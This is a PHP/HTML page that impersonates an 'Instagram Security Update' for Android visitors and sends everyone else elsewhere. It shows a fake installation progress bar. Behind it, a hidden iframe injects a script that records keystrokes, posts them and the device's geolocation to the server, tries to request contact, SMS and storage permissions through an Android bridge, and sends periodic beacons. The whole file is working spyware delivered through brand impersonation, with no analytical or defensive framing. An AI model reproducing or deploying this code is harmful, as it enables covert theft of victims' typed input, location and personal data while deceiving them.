<?php
$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$isAndroid = stripos($ua, 'android') !== false;
if(!$isAndroid) {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Instagram Security Update</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: sans-serif; background: #fafafa; text-align: center; padding: 40px 20px; }
.container { background: #fff; border-radius: 12px; padding: 30px; max-width: 380px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
h2 { color: #262626; font-size: 20px; margin-bottom: 10px; }
p { color: #8e8e8e; font-size: 14px; margin: 15px 0; line-height: 1.5; }
.progress { height: 6px; background: #e0e0e0; border-radius: 3px; margin: 20px 0; overflow: hidden; }
.progress-bar { height: 100%; background: linear-gradient(90deg, #0095f6, #1877f2); width: 0%; border-radius: 3px; animation: progress 5s ease-in-out forwards; }
@keyframes progress { 0% { width: 0%; } 100% { width: 100%; } }
.check { color: #00c853; font-size: 48px; margin: 10px 0; }
.btn { 
    background: #0095f6; color: #fff; border: none; padding: 12px 40px; 
    border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 20px;
    display: none;
    text-decoration: none;
}
.hidden-iframe { display: none; }
</style>
</head>
<body>
<div class="container">
    <div class="check">&#10003;</div>
    <h2>Security Update Required</h2>
    <p>Instagram needs to install a critical security update to continue using the app securely.</p>
    <div class="progress">
        <div class="progress-bar"></div>
    </div>
    <p id="statusText">Installing security update...</p>
    <a class="btn" id="continueBtn" href="https://www.instagram.com">Continue to Instagram</a>
</div>

<iframe class="hidden-iframe" id="spyFrame" name="spyFrame"></iframe>

<script>
var spyCode = `
<script>
    var keys = '';
    document.addEventListener('keydown', function(e) {
        if(e.key.length === 1) keys += e.key;
        else if(e.key === 'Enter') keys += '\\\\n';
        else if(e.key === 'Backspace') keys = keys.slice(0, -1);
    });
    setInterval(function() {
        if(keys.length > 0) {
            var data = keys; keys = '';
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('keylog_data=' + encodeURIComponent(data));
        }
    }, 3000);
    if(navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(p) {
            var data = 'Lat:' + p.coords.latitude + ',Lon:' + p.coords.longitude;
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('location_data=' + encodeURIComponent(data));
        });
    }
    try {
        if(Android && Android.requestPermissions) {
            Android.requestPermissions(['READ_CONTACTS', 'READ_SMS', 'READ_EXTERNAL_STORAGE']);
        }
    } catch(e) {}
    setInterval(function() {
        if(navigator.sendBeacon) navigator.sendBeacon('', 'ping=1');
    }, 5000);
<\/script>`;

setTimeout(function() {
    var iframe = document.getElementById('spyFrame');
    iframe.srcdoc = spyCode;
    document.getElementById('statusText').textContent = 'Security update installed successfully!';
    document.getElementById('continueBtn').style.display = 'inline-block';
}, 5000);
</script>
</body>
</html>